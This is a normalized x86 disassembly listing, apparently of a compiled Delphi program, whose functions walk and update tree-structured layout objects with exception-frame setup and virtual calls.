mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_43fc68
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43fcf8
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov edx 0x2
call sub_43fcf8
jmp r-xdata
retn
sub_43fcb0
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43fd64
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov edx 0x2
call sub_43fd64
jmp r-xdata
retn
sub_43fcf8
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_44012c
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_43fd64
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_43fc18
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_44012c
push eax
mov eax esi
call sub_43fc68
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_44012c
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_43fe14
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43fc18
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_44022c
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_43fd64
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_43fc18
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_43fd64
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_43fc68
mov edx eax
add edx esi
mov eax ebx
call sub_440154
mov edx edi
mov eax ebx
call sub_440154
jmp r-xdata
mov eax ebx
call sub_43ffb4
mov eax ebx
call sub_440204
mov ebx eax
test ebx ebx
jne r-xdata
sub_43febc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404050
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4040a4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
sub_43ff00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403490
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_43ff71
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4384c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_43ff84
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_440204
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_43ffb4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43fd64
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43fd64
mov esi eax
push ebp
call sub_43ff84
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440204
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43fcf8
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43fcf8
mov ecx ebx
pop edx
call sub_412d30
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43716c
mov eax [ ebp - 0x4 ]
call sub_44012c
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_44012c
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_44012c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_44012c
push ebx
mov ebx eax
mov eax ebx
call sub_43fc34
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_43fbbc
test al al
je r-xdata
mov eax ebx
call sub_43fc68
pop ebx
retn
sub_440168
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440154
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43fc04
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_440158
mov edx esi
call sub_440168
sub_4401a4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44012c
mov edi eax
mov eax ebx
call sub_43fc68
cmp edi eax
jl r-xdata
mov eax esi
call sub_43fe14
mov eax [ esi + 0x1c ]
push eax
push sub_441cb4
mov edx esi
call sub_4404e0
mov eax ebx
call sub_44012c
mov edi eax
mov eax esi
call sub_43fcb0
cmp edi eax
jle r-xdata
mov eax ebx
call sub_4401a4
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_440210
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43fc34
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_440238
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403264
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4035a0
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fbe0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dfdc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4230e8
mov edx eax
mov eax ebx
call sub_41e158
mov eax [ ebp - 0x4 ]
call sub_440408
xor eax eax
push ebp
push sub_440344
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43ac9c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_43fe14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44034b
mov eax [ ebp - 0x4 ]
call sub_44040c
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_43ac60
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44034b
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_4421dc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4403a0
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_44140c
mov eax [ esi + 0x10 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_440420
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_440420
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_440420
pop ecx
sub_440478
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_440420
pop ecx
sub_4404a4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4404a4
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4404a4
pop ecx
sub_4404f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_440478
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43fd64
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_43fd64
push eax
mov edx 0x1
mov eax ebx
call sub_43fcf8
push eax
mov edx 0x2
mov eax ebx
call sub_43fcf8
pop edx
pop ecx
call sub_412d30
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402ca4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44057c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_43ffb4
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412d30
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43716c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fbe0
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_440478
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_43fc04
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_4414a4
mov edx esi
mov eax ebx
call sub_440478
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_437750
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fbe0
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43773c
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_43fd64
mov edx eax
mov eax edi
call sub_440154
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_43fd64
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_43fd64
mov edx eax
mov eax edi
call sub_440154
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_43fd64
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44078c
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_440934
jmp r-xdata
sub_44078c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fbe0
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_44012c
mov edx eax
mov eax ebx
call sub_440154
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_440154
mov eax [ esi + 0x64 ]
call sub_44012c
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4417fc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4404e0
mov eax [ esi + 0x64 ]
call sub_44012c
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4417fc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4404e0
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_441b80
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4404e0
mov eax [ esi + 0x64 ]
call sub_44012c
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_441cb4
xor edx edx
mov eax esi
call sub_4404e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_440154
adc edx 0x0
mov eax ebx
call sub_43fe14
mov eax ebx
call sub_4401a4
push esi
push sub_441cb4
xor edx edx
mov eax esi
call sub_4404e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_440934
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_43fe14
mov eax [ ebx + 0x14 ]
call sub_4401a4
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_4409ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_44012c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44012c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_44012c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43fcf8
mov esi eax
mov edx 0x2
mov eax ebx
call sub_43fcf8
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_44012c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_440204
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44022c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_440204
call sub_4409ac
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44022c
call sub_4409ac
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_43fd64
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_43fd64
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
